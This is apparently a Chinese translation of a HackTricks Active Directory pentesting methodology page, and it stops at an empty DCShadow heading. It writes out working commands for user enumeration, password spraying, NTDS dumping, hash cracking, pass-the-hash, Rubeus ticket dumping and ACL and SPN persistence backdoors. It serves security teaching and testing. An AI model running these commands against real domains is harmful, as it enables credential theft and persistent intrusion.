# Active Directory 方法论

{{#include ../../banners/hacktricks-training.md}}

## 基本概述

**Active Directory** 是一项基础技术，使 **网络管理员** 能够在网络内高效地创建和管理 **domains**、**users** 和 **objects**。它被设计为可扩展，便于将大量用户组织成可管理的 **groups** 和 **subgroups**，并在不同层级上控制 **access rights**。

**Active Directory** 的结构由三个主要层级组成：**domains**、**trees** 和 **forests**。一个 **domain** 包含一组对象，例如 **users** 或 **devices**，共享同一个数据库。**Trees** 是这些 domains 的分组，具有共同的结构，而 **forest** 表示由多个 trees 组成并通过 **trust relationships** 相互连接的集合，构成组织结构的最上层。在每个层级上可以指定特定的 **access** 和 **communication rights**。

Active Directory 的关键概念包括：

1. **Directory** – 存放所有与 Active Directory 对象相关的信息。
2. **Object** – 表示目录内的实体，包括 **users**、**groups** 或 **shared folders**。
3. **Domain** – 作为目录对象的容器，多个 domains 可以共存于同一 **forest** 中，每个 domain 拥有自己的对象集合。
4. **Tree** – 共享根域的 domains 的分组。
5. **Forest** – Active Directory 中的组织结构顶层，由若干 trees 组成并具有相互的 **trust relationships**。

**Active Directory Domain Services (AD DS)** 包含了一系列对集中管理和网络内部通信至关重要的服务。这些服务包括：

1. **Domain Services** – 集中数据存储并管理 **users** 与 **domains** 之间的交互，包括 **authentication** 和 **search** 功能。
2. **Certificate Services** – 负责安全 **digital certificates** 的创建、分发和管理。
3. **Lightweight Directory Services** – 通过 **LDAP protocol** 支持目录启用的应用。
4. **Directory Federation Services** – 提供 **single-sign-on** 能力，使用户能在单一会话中对多个 web 应用进行认证。
5. **Rights Management** – 通过控制未经授权的分发和使用来保护版权材料。
6. **DNS Service** – 对 **domain names** 的解析至关重要。

For a more detailed explanation check: [**TechTerms - Active Directory Definition**](https://techterms.com/definition/active_directory)

### **Kerberos Authentication**

要学习如何 **attack an AD**，你需要非常了解 **Kerberos authentication process**。\
[**Read this page if you still don't know how it works.**](kerberos-authentication.md)

## 速查表

可以访问 [https://wadcoms.github.io/](https://wadcoms.github.io) 来快速查看可用于枚举/利用 AD 的命令。

> [!WARNING]
> Kerberos communication **requires a full qualifid name (FQDN)** for performing actions. If you try to access a machine by the IP address, **it'll use NTLM and not kerberos**.

## Recon Active Directory (No creds/sessions)

如果你只能访问 AD 环境但没有任何 credentials/sessions，可以：

- **Pentest the network:**
- 扫描网络，找出主机和开放端口并尝试 **exploit vulnerabilities** 或 **extract credentials**（例如，[printers could be very interesting targets](ad-information-in-printers.md)）。
- 枚举 DNS 可以提供关于域内关键服务器的信息，如 web、printers、shares、vpn、media 等。
- `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
- 查看通用的 [**Pentesting Methodology**](../../generic-methodologies-and-resources/pentesting-methodology.md) 以获取更多关于如何执行这些操作的信息。
- **Check for null and Guest access on smb services**（这在现代 Windows 版本上通常无效）:
- `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
- `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
- `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
- 关于如何枚举 SMB server 的更详细指南可见：


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumerate Ldap**
- `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
- 关于如何枚举 LDAP 的更详细指南可见（请**特别注意 anonymous access**）:


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Poison the network**
- 通过 [**impersonating services with Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md) 收集凭证。
- 通过 [**abusing the relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) 访问主机。
- 通过 **exposing** [**fake UPnP services with evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856) 收集凭证。
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
- 从域环境内的内部文档、社交媒体、服务（主要是 web）以及公开渠道提取用户名/姓名等信息。
- 如果找到公司员工的全名，可以尝试不同的 AD **username conventions**（[**read this**](https://activedirectorypro.com/active-directory-user-naming-convention/)）。最常见的命名方式有：_NameSurname_, _Name.Surname_, _NamSur_（各取 3 个字母），_Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 以及 3 个随机字母加 3 个随机数字（如 abc123）。
- 工具：
- [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
- [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### User enumeration

- **Anonymous SMB/LDAP enum:** 请查看 [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) 和 [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md) 页面。
- **Kerbrute enum**: 当请求的用户名无效时，服务器会使用 **Kerberos error** 代码 _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_ 响应，从而可以确定用户名无效。**Valid usernames** 会在 AS-REP 响应中返回 **TGT**，或者返回错误 _KRB5KDC_ERR_PREAUTH_REQUIRED_，表示该用户需要进行 pre-authentication。
- **No Authentication against MS-NRPC**: 使用 auth-level = 1 (No authentication) 针对域控制器上的 MS-NRPC (Netlogon) 接口。该方法在绑定 MS-NRPC 接口后调用 `DsrGetDcNameEx2` 函数，以在不提供任何凭据的情况下检查用户或计算机是否存在。该类型的枚举由 [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) 工具实现。相关研究见 [here](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)
```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```
- **OWA (Outlook Web Access) Server**

如果你在网络中发现了这类服务器，你还可以对其进行 **user enumeration**。例如，你可以使用工具 [**MailSniper**](https://github.com/dafthack/MailSniper):
```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```
> [!WARNING]
> You can find lists of usernames in [**this github repo**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names)  and this one ([**statistically-likely-usernames**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> 不过，你应该已经在之前执行的 recon 步骤中收集到公司的员工姓名。拥有名和姓后，你可以使用脚本 [**namemash.py**](https://gist.github.com/superkojiman/11076951) 来生成可能的有效用户名。

### Knowing one or several usernames

好，你已经有一个有效的用户名但没有密码……那么尝试：

- [**ASREPRoast**](asreproast.md): 如果某个用户 **doesn't have** 属性 _DONT_REQ_PREAUTH_，你可以为该用户 **request a AS_REP message**，该消息将包含一些由用户密码派生并加密的数据。
- [**Password Spraying**](password-spraying.md): 尝试对每个已发现的用户使用最常见的 **common passwords**，也许有人在使用弱密码（注意 password policy！）。
- 注意你也可以 **spray OWA servers** 来尝试获取用户的 mail servers 访问权限。

{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

你可能能够 **obtain** 一些 challenge **hashes** 来 **crack**，通过对 **network** 的某些协议进行 **poisoning**：

{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

如果你已经成功 enumerate the active directory，你将获得 **more emails and a better understanding of the network**。你可能能够强制 NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) 来访问 AD env。

### NetExec workspace-driven recon & relay posture checks

- 使用 **`nxcdb` workspaces** 在每次 engagement 中保存 AD recon 状态：`workspace create <name>` 会在 `~/.nxc/workspaces/<name>` 下为每个协议生成 SQLite DB（smb/mssql/winrm/ldap/etc）。使用 `proto smb|mssql|winrm` 切换视图，并用 `creds` 列出收集到的 secrets。完成后手动清除敏感数据：`rm -rf ~/.nxc/workspaces/<name>`。
- 使用 **`netexec smb <cidr>`** 快速进行子网发现，会显示 **domain**、**OS build**、**SMB signing requirements** 和 **Null Auth**。显示 `(signing:False)` 的成员容易被 **relay-prone**，而 DCs 通常要求 signing。
- 从 NetExec 输出直接生成 **hostnames in /etc/hosts** 以便于定位目标：
```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```
- 当 **SMB relay to the DC is blocked** by signing，仍然探测 **LDAP** posture: `netexec ldap <dc>` highlights `(signing:None)` / weak channel binding。一个要求 SMB signing 但禁用 LDAP signing 的 DC 仍然是可用于滥用的 **relay-to-LDAP** 目标，例如 **SPN-less RBCD**。

### 客户端打印机凭证 leaks → 批量域凭证验证

- 打印机/网页 UI 有时会 **embed masked admin passwords in HTML**。查看 source/devtools 可暴露明文（例如，`<input value="<password>">`），允许通过 Basic-auth 访问 scan/print repositories。
- 检索到的打印任务可能包含带有每用户密码的 **plaintext onboarding docs**。测试时保持配对对齐：
```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```
### 窃取 NTLM 凭证

如果你可以使用 **null 或 guest 用户** **访问其他 PC 或共享**，你可以 **放置文件**（例如 SCF 文件），当这些文件以某种方式被访问时，会 **触发对你的 NTLM 验证**，这样你就可以 **窃取** **NTLM challenge** 来破解它：

{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** 将你已有的每个 NT hash 视为其他更慢格式（其密钥材料直接由 NT hash 导出）的候选密码。与其在 Kerberos RC4 ticket、NetNTLM challenges 或缓存凭证中暴力破解长口令，不如将 NT hashes 输入到 Hashcat 的 NT-candidate 模式，让它在不获取明文的情况下验证密码重用。这在域被攻破后尤为有效，因为你可以收集到成千上万的当前及历史 NT hashes。

在以下情况下使用 shucking：

- 你拥有来自 DCSync、SAM/SECURITY dumps 或凭证保管库的 NT 集合，需要测试在其他域/林中的重用情况。
- 你捕获了基于 RC4 的 Kerberos 材料（`$krb5tgs$23$`、`$krb5asrep$23$`）、NetNTLM 响应或 DCC/DCC2 blob。
- 你想快速证明对长、不可破解口令的重用并立即通过 Pass-the-Hash 进行横向移动。

该技术**不适用于**密钥不是 NT hash 的加密类型（例如 Kerberos etype 17/18 AES）。如果域强制只使用 AES，则必须回退到常规密码模式。

#### Building an NT hash corpus

- **DCSync/NTDS** – 使用 `secretsdump.py` 带 history 获取尽可能多的 NT hashes（及其历史值）：

```bash
secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
```

历史条目显著扩大了候选池，因为 Microsoft 每个账户最多可以存储 24 个以前的 hash。有关更多获取 NTDS secrets 的方法请参见：

{{#ref}}
dcsync.md
{{#endref}}

- **Endpoint cache dumps** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa`（或 Mimikatz `lsadump::sam /patch`）可提取本地 SAM/SECURITY 数据和缓存的域登录（DCC/DCC2）。去重并将这些 hash 附加到同一个 `nt_candidates.txt` 列表中。
- **跟踪元数据** – 保留产生每个 hash 的用户名/域（即使字典只包含 hex）。匹配的 hash 一旦 Hashcat 打印出胜出候选项，就能立即告诉你哪个主体在重用密码。
- 优先使用来自相同林或受信任林的候选项；这能最大化 shucking 时的重叠机会。

#### Hashcat NT-candidate modes

| Hash 类型                               | 密码模式       | NT-Candidate 模式 |
| ---------------------------------------- | ------------- | ----------------- |
| Domain Cached Credentials (DCC)          | 1100          | 31500             |
| Domain Cached Credentials 2 (DCC2)       | 2100          | 31600             |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500          | 27000             |
| NetNTLMv2                                | 5600          | 27100             |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500          | _N/A_             |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100         | 35300             |
| Kerberos 5 etype 23 AS-REP               | 18200         | 35400             |

注意：

- NT-candidate 输入**必须保持原始 32-hex NT hashes**。禁用规则引擎（不要用 `-r`、不要用混合模式），因为变形会破坏候选密钥材料。
- 这些模式本身并不更快，但 NTLM 的键空间（在 M3 Max 上约 ~30,000 MH/s）比 Kerberos RC4（约 ~300 MH/s）快约 100×。测试一个策划好的 NT 列表比在慢格式中探索整个密码空间便宜得多。
- 始终运行 **最新的 Hashcat 构建**（`git clone https://github.com/hashcat/hashcat && make install`），因为模式 31500/31600/35300/35400 是近期加入的。
- 目前 AS-REQ Pre-Auth 没有 NT 模式，且 AES etypes（19600/19700）需要明文密码，因为它们的密钥是通过 PBKDF2 从 UTF-16LE 密码派生的，而不是原始 NT hashes。

#### Example – Kerberoast RC4 (mode 35300)

1. 使用低权限用户捕获目标 SPN 的 RC4 TGS（详情见 Kerberoast 页面）：

{{#ref}}
kerberoast.md
{{#endref}}

```bash
GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
```

2. 用你的 NT 列表对票据进行 shuck：

```bash
hashcat -m 35300 roastable_TGS nt_candidates.txt
```

Hashcat 会从每个 NT candidate 推导出 RC4 密钥并验证 `$krb5tgs$23$...` blob。匹配则确认该服务账户使用的是你已有的某个 NT hash。

3. 立即通过 PtH 进行横向：

```bash
nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
```

如果需要，你也可以稍后用 `hashcat -m 1000 <matched_hash> wordlists/` 恢复明文。

#### Example – Cached credentials (mode 31600)

1. 从已攻陷的工作站导出缓存的登录信息：

```bash
nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
```

2. 将感兴趣的域用户的 DCC2 行复制到 `dcc2_highpriv.txt` 并进行 shuck：

```bash
hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
```

3. 成功匹配会产出你列表中已知的 NT hash，证明该缓存用户在重用密码。可直接用于 PtH（`nxc smb <dc_ip> -u highpriv -H <hash>`），或在快速 NTLM 模式下离线暴力破解以恢复字符串。

相同的工作流程也适用于 NetNTLM challenge-responses（`-m 27000/27100`）和 DCC（`-m 31500`）。一旦识别出匹配，你可以发起 relay、SMB/WMI/WinRM PtH，或离线用 masks/rules 重新破解 NT hash。

## 带有凭证/会话的 Active Directory 枚举

在此阶段，你需要已攻陷一个有效域账户的凭证或会话。如果你拥有某些有效凭证或以域用户的 shell，**请记住之前提到的选项仍然可以用来攻陷其他用户**。

在开始经过身份验证的枚举之前，你应该了解 **Kerberos double hop problem**。

{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### 枚举

攻陷一个账户是开始攻陷整个域的**重要一步**，因为你将能够开始进行 **Active Directory 枚举：**

关于 [**ASREPRoast**](asreproast.md)，你现在可以找到每个可能易受攻击的用户；关于 [**Password Spraying**](password-spraying.md)，你可以获得**所有用户名的列表**并尝试使用被攻陷账户的密码、空密码或新的可行密码。

- 你可以使用 [**CMD to perform a basic recon**](../basic-cmd-for-pentesters.md#domain-info)
- 你也可以使用 [**powershell for recon**](../basic-powershell-for-pentesters/index.html)，这会更隐蔽
- 你也可以 [**use powerview**](../basic-powershell-for-pentesters/powerview.md) 来提取更详细的信息
- 活动目录中另一个用于侦察的强大工具是 [**BloodHound**](bloodhound.md)。根据你使用的收集方法，它**不是非常隐蔽**，但**如果你不在意**，强烈推荐一试。找出哪些用户能 RDP、找出到其他组的路径等。
- **其他自动化 AD 枚举工具有：** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- [**AD 的 DNS 记录**](ad-dns-records.md)，因为其中可能包含有趣信息。
- 一个带 GUI 的工具用于枚举目录是来自 SysInternal 套件的 **AdExplorer.exe**。
- 你也可以用 **ldapsearch** 在 LDAP 数据库中搜索，查找字段 _userPassword_ 和 _unixUserPassword_ 中的凭证，甚至查看 _Description_ 字段。参见 [Password in AD User comment on PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) 获取其他方法。
- 如果你使用 **Linux**，也可以用 [**pywerview**](https://github.com/the-useless-one/pywerview) 枚举域。
- 你也可以尝试以下自动化工具：
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **提取所有域用户**

从 Windows 很容易获取所有域用户名（`net user /domain`、`Get-DomainUser` 或 `wmic useraccount get name,sid`）。在 Linux 上，你可以使用：`GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` 或 `enum4linux -a -u "user" -p "password" <DC IP>`

> 即便本节看起来篇幅较短，这也是最重要的部分。访问这些链接（主要是 cmd、powershell、powerview 和 BloodHound），学习如何枚举域并练习直到熟练。在评估过程中，这将是通向 DA 的关键时刻，或决定无法继续的判断点。

### Kerberoast

Kerberoasting 涉及获取与用户账户关联的服务所使用的 **TGS tickets**，并离线破解其加密 —— 该加密基于用户密码。

更多内容见：

{{#ref}}
kerberoast.md
{{#endref}}

### 远程连接 (RDP, SSH, FTP, Win-RM, etc)

一旦你获取了一些凭证，可以检查是否可以访问任何 **主机**。为此，你可以使用 **CrackMapExec** 根据端口扫描结果尝试通过不同协议连接多台服务器。

### 本地权限提升

如果你以常规域用户的身份已攻陷凭证或会话，并且该用户可以**访问**域内的任何机器，你应尝试在本地提升权限并搜索凭证。只有拥有本地管理员权限，你才能**转储其他用户的哈希**（内存中的 LSASS 或本地的 SAM）。

本书中有一整页关于 [**Windows 本地权限提升**](../windows-local-privilege-escalation/index.html) 的内容和一份 [**清单**](../checklist-windows-privilege-escalation.md)。另外别忘了使用 [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite)。

### 当前会话票据

在当前用户中找到能让你访问意外资源的 **tickets** 的可能性非常**低**，但你可以检查：
```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```
### NTLM Relay

If you have managed to enumerate the Active Directory you will have **more emails and a better understanding of the network**. You might be able to to force NTLM [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)**.**

### Looks for Creds in Computer Shares | SMB Shares

现在你有了一些基本 credentials，你应该检查是否能 **find** 在 AD 内被共享的任何 **interesting files**。你可以手工执行此操作，但这是非常无聊且重复的任务（如果你发现数百个需要检查的文档则更加如此）。

[**Follow this link to learn about tools you could use.**](../../network-services-pentesting/pentesting-smb/index.html#domain-shared-folders-search)

### Steal NTLM Creds

如果你可以 **access other PCs or shares**，你可以 **place files**（例如 SCF 文件），当这些文件被访问时会触发针对你的 **NTLM authentication**，这样你就可以 **steal** **NTLM challenge** 来破解它：


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### CVE-2021-1675/CVE-2021-34527 PrintNightmare

该漏洞允许任何经过身份验证的用户**compromise the domain controller**。


{{#ref}}
printnightmare.md
{{#endref}}

## 在 Active Directory 上使用特权凭证/会话进行特权提升

**对于以下技术，普通域用户是不够的，你需要一些特殊的权限/credentials 才能执行这些攻击。**

### Hash extraction

希望你已经使用 [AsRepRoast](asreproast.md), [Password Spraying](password-spraying.md), [Kerberoast](kerberoast.md), [Responder](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)（包括 relaying）, [EvilSSDP](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md), [escalating privileges locally](../windows-local-privilege-escalation/index.html) 等方法**compromise some local admin** 账户。\
然后，是时候在内存和本地转储所有 hashes 了。\
[**Read this page about different ways to obtain the hashes.**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Pass the Hash

**Once you have the hash of a user**, you can use it to **impersonate** it.\
你需要使用某个 **tool** 来使用该 **hash** 执行 **NTLM authentication**，**或者**你可以创建一个新的 **sessionlogon** 并将该 **hash** 注入到 **LSASS** 中，这样当任何 **NTLM authentication is performed** 时，就会使用该 **hash**。最后一种方法是 mimikatz 所做的。\
[**Read this page for more information.**](../ntlm/index.html#pass-the-hash)

### Over Pass the Hash/Pass the Key

此攻击旨在 **use the user NTLM hash to request Kerberos tickets**，作为常见的通过 NTLM 的 Pass The Hash 的替代方案。因此，在 NTLM 协议被禁用且仅允许 Kerberos 作为认证协议的网络中，这尤其有用。


{{#ref}}
over-pass-the-hash-pass-the-key.md
{{#endref}}

### Pass the Ticket

在 **Pass The Ticket (PTT)** 攻击方法中，攻击者**steal a user's authentication ticket**，而不是其密码或 hash 值。被窃取的 ticket 随后用于 **impersonate the user**，从而在网络内获得对资源和服务的未授权访问。


{{#ref}}
pass-the-ticket.md
{{#endref}}

### Credentials Reuse

如果你拥有某个 **local administrator** 的 **hash** 或 **password**，你应该尝试用它在其他 **PCs** 上 **login locally**。
```bash
# Local Auth Spray (once you found some local admin pass or hash)
## --local-auth flag indicate to only try 1 time per machine
crackmapexec smb --local-auth 10.10.10.10/23 -u administrator -H 10298e182387f9cab376ecd08491764a0 | grep +
```
> [!WARNING]
> 注意：这会产生相当多的**噪声**，**LAPS** 可**缓解**。

### MSSQL Abuse & Trusted Links

如果用户具有**访问 MSSQL 实例**的权限，他可能能够利用它在 MSSQL 主机上**执行命令**（如果以 SA 运行）、**窃取** NetNTLM **hash**，甚至执行**relay attack**。\
此外，如果一个 MSSQL 实例被另一个 MSSQL 实例信任（database link）。如果用户对被信任的数据库具有权限，他将能够**利用信任关系在另一个实例中也执行查询**。这些信任可以串联，在某个时刻用户可能会找到一个配置错误的数据库，从而能够执行命令。\
**数据库之间的链接甚至可以跨越 forest trusts。**


{{#ref}}
abusing-ad-mssql.md
{{#endref}}

### IT 资产/部署平台 滥用

第三方的清单和部署套件通常暴露出通往凭证和代码执行的强大路径。参见：

{{#ref}}
sccm-management-point-relay-sql-policy-secrets.md
{{#endref}}

{{#ref}}
lansweeper-security.md
{{#endref}}

### Unconstrained Delegation

如果你发现任何 Computer 对象具有属性 [ADS_UF_TRUSTED_FOR_DELEGATION](<https://msdn.microsoft.com/en-us/library/aa772300(v=vs.85).aspx>)，并且你在该计算机上拥有域权限，你将能够从每个登录到该计算机的用户的内存中转储 TGTs。\
因此，如果一名 **Domain Admin 登录到该计算机**，你将能够转储他的 TGT 并使用 [Pass the Ticket](pass-the-ticket.md) 模拟他。\
得益于 constrained delegation，你甚至可以**自动攻陷一个 Print Server**（希望它不是 DC）。

{{#ref}}
unconstrained-delegation.md
{{#endref}}

### Constrained Delegation

如果某个用户或计算机被允许使用 "Constrained Delegation"，它将能够**模拟任何用户来访问某台计算机上的某些服务**。\
然后，如果你**攻破了该用户/计算机的 hash**，你将能够**模拟任何用户**（甚至是 domain admins）来访问这些服务。

{{#ref}}
constrained-delegation.md
{{#endref}}

### Resourced-based Constrain Delegation

在远程计算机的 Active Directory 对象上拥有 **WRITE** 权限能够实现以**提升的权限**进行代码执行：

{{#ref}}
resource-based-constrained-delegation.md
{{#endref}}

### Permissions/ACLs Abuse

被攻陷的用户可能在某些域对象上拥有一些**有趣的权限**，这些权限可能让你进行横向**移动**/权限**提升**。

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Printer Spooler service abuse

在域内发现 **Spool service 正在监听** 可被**滥用**以**获取新凭证**并**提升权限**。

{{#ref}}
printers-spooler-service-abuse.md
{{#endref}}

### Third party sessions abuse

如果**其他用户**访问**被攻陷**的机器，就有可能**从内存中收集凭证**，甚至**向他们的进程注入 beacons**以模拟他们。\
通常用户会通过 RDP 访问系统，下面说明了对第三方 RDP 会话执行的几种攻击：

{{#ref}}
rdp-sessions-abuse.md
{{#endref}}

### LAPS

**LAPS** 提供了一种管理**域联机计算机本地 Administrator 密码**的系统，确保密码**随机化**、唯一且频繁**更改**。这些密码存储在 Active Directory 中，并且通过 ACL 控制仅授权用户可访问。拥有足够的权限访问这些密码时，就可以实现对其他计算机的 pivot。

{{#ref}}
laps.md
{{#endref}}

### Certificate Theft

**从被攻陷的机器收集证书**可能是提升环境内权限的一种途径：

{{#ref}}
ad-certificates/certificate-theft.md
{{#endref}}

### Certificate Templates Abuse

如果配置了**易受攻击的模板**，则可以滥用它们进行权限提升：

{{#ref}}
ad-certificates/domain-escalation.md
{{#endref}}

## Post-exploitation with high privilege account

### Dumping Domain Credentials

一旦你获得 **Domain Admin** 或更好的 **Enterprise Admin** 权限，你可以**转储****域数据库**：_ntds.dit_。

[**More information about DCSync attack can be found here**](dcsync.md).

[**More information about how to steal the NTDS.dit can be found here**](https://github.com/carlospolop/hacktricks/blob/master/windows-hardening/active-directory-methodology/broken-reference/README.md)

### Privesc as Persistence

之前讨论的一些技术可以被用于持久化。\
例如你可以：

- Make users vulnerable to [**Kerberoast**](kerberoast.md)

```bash
Set-DomainObject -Identity <username> -Set @{serviceprincipalname="fake/NOTHING"}r
```

- Make users vulnerable to [**ASREPRoast**](asreproast.md)

```bash
Set-DomainObject -Identity <username> -XOR @{UserAccountControl=4194304}
```

- Grant [**DCSync**](#dcsync) privileges to a user

```bash
Add-DomainObjectAcl -TargetIdentity "DC=SUB,DC=DOMAIN,DC=LOCAL" -PrincipalIdentity bfarmer -Rights DCSync
```

### Silver Ticket

**Silver Ticket attack** 利用 **NTLM hash**（例如 **PC account 的 hash**）创建针对特定服务的合法 Ticket Granting Service (TGS) ticket。此方法用于**获取该服务的访问权限**。

{{#ref}}
silver-ticket.md
{{#endref}}

### Golden Ticket

**Golden Ticket attack** 涉及攻击者获取 Active Directory 环境中 **krbtgt 账户的 NTLM hash**。该账户用于签名所有 **Ticket Granting Tickets (TGTs)**，这是在 AD 网络中进行身份验证的关键。

一旦攻击者获得该 hash，他们就可以为任意账户创建 **TGTs**（Silver ticket attack 的延伸）。

{{#ref}}
golden-ticket.md
{{#endref}}

### Diamond Ticket

这类票据类似于 golden tickets，但以**绕过常见的 golden tickets 检测机制**的方式伪造。

{{#ref}}
diamond-ticket.md
{{#endref}}

### **Certificates Account Persistence**

**拥有某个账户的证书或能够请求其证书**是持久化该用户账户的非常有效的方法（即使用户更改密码）：

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

### **Certificates Domain Persistence**

**使用证书也可以在域内以高权限实现持久化：**

{{#ref}}
ad-certificates/domain-persistence.md
{{#endref}}

### AdminSDHolder Group

Active Directory 中的 **AdminSDHolder** 对象通过对特权组（如 Domain Admins 和 Enterprise Admins）应用标准的 **Access Control List (ACL)** 来确保其安全性，从而防止未授权更改。然而，这一功能也可能被滥用；如果攻击者修改 AdminSDHolder 的 ACL 以授予普通用户完全访问权限，该用户将获得对所有特权组的广泛控制。这个旨在保护的安全措施在未被严格监控时可能反过来导致未授权访问。

[**More information about AdminDSHolder Group here.**](privileged-groups-and-token-privileges.md#adminsdholder-group)

### DSRM Credentials

在每台 **Domain Controller (DC)** 内部都存在一个**本地管理员**账户。通过在这样的机器上获得管理员权限，可以使用 **mimikatz** 提取本地 Administrator 的 hash。随后需要修改注册表以**启用该密码的使用**，从而允许远程访问本地 Administrator 账户。

{{#ref}}
dsrm-credentials.md
{{#endref}}

### ACL Persistence

你可以**赋予**某个**用户**对某些特定域对象的**特殊权限**，这些权限将允许该用户在将来**提升权限**。

{{#ref}}
acl-persistence-abuse/
{{#endref}}

### Security Descriptors

**security descriptors** 用于**存储**对象的**权限**。如果你能对某个对象的 **security descriptor** 做出**一点小改动**，你就可以在不成为特权组成员的情况下，获得对该对象的非常有价值的权限。

{{#ref}}
security-descriptors.md
{{#endref}}

### Skeleton Key

在内存中修改 **LSASS** 以建立一个**通用密码（universal password）**，从而允许访问所有域账户。

{{#ref}}
skeleton-key.md
{{#endref}}

### Custom SSP

[Learn what is a SSP (Security Support Provider) here.](../authentication-credentials-uac-and-efs/index.html#security-support-provider-interface-sspi)\
你可以创建你自己的 **SSP** 来**以明文**捕获用于访问机器的**凭证**。

{{#ref}}
custom-ssp.md
{{#endref}}

### DCShadow

